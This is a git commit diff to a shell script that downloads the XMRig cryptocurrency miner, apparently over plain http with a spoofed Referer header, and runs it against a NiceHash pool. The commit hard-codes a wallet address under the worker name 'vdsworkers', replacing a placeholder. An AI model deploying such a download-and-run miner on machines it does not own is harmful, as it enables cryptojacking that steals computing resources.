0e06918622694602432ede2acc6af8185a12df14
æm <45801669+Mid0aria@users.noreply.github.com>
2022-10-15 20:54:05 +0300

    Update nicehashlinuxwithxmrig.sh

--- nicehashlinuxwithxmrig.sh
+++ nicehashlinuxwithxmrig.sh
@@ -1,19 +1,6 @@
-nicehashwallet="yourwalletadress"
-
-
-#Download xmrig
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz
-#un archive
+#!/bin/sh
+wget=/usr/bin/wget
+wget http://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz --header "Referer: github.com"
 tar -xf xmrig-6.18.0-linux-static-x64.tar.gz
-
 cd xmrig-6.18.0
-
-./xmrig -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u $nicehashwallet -p x -k --nicehash -a rx/0
-
-
-
-
-
-
-
-
+./xmrig -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 3NXfb7dBziS9vex97LqFQB6KvEYxTBH2of.vdsworkers -p x -k --nicehash -a rx/0
